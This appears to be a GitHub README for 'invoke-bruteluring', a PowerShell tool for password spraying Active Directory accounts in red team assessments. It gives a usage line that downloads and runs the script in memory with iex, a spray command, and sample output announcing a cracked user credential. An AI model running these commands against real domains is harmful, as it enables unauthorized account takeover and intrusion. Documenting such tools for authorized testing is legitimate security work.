# invoke-bruteluring

## Getting started

invoke-bruteluring is a password spraying tool used to guess password on red team or Active Directory security assessments.

### Usage

```
iex (new-object net.webclient).downloadstring("https://raw.githubusercontent.com/viksecurity/invoke-bruteluring/main/invoke-bruteluring.ps1")
Invoke-Bruteluring -password RödaLacket2020 -targetdomain caballo-con-leche.local

(_)               | |             | |              | |     | |          (_)                                                        
 _ _ ____   _____ | | _____ ______| |__  _ __ _   _| |_ ___| |_   _ _ __ _ _ __   __ _                                             
| | '_ \ \ / / _ \| |/ / _ \______| '_ \| '__| | | | __/ _ \ | | | | '__| | '_ \ / _ |                                             
| | | | \ V / (_) |   <  __/      | |_) | |  | |_| | ||  __/ | |_| | |  | | | | | (_| |                                            
|_|_| |_|\_/ \___/|_|\_\___|      |_.__/|_|   \__,_|\__\___|_|\__,_|_|  |_|_| |_|\__, |                                            
                                                                                  __/ |                                            
                                                                                 |___/                                             
                                                                                                                                   
v0.4 viksecurity                                                                                                                   
                                                                                                                                   
[+] Domain is: caballo-con-leche.local                                                                                                          
[+] Domain PDC is DC.caballo-con-leche.local                                                                                                 
[+] Number of users: 9                                                                                                             
[+] Number of passwords: 1                                                                                                         
[+] MaxBadPassword allowed: 0                                                                                                      
[+] No lockout set. Pwning all the things...                                                                                       
[!] Users left to pwn: 9                                                                                                           
Press y to pwn: y                                                                                                                  
                                                                                                                                   
pwned! user4 \ RödaLacket2020                                                                                                      
                                                                                                                                   
[+] Done
```
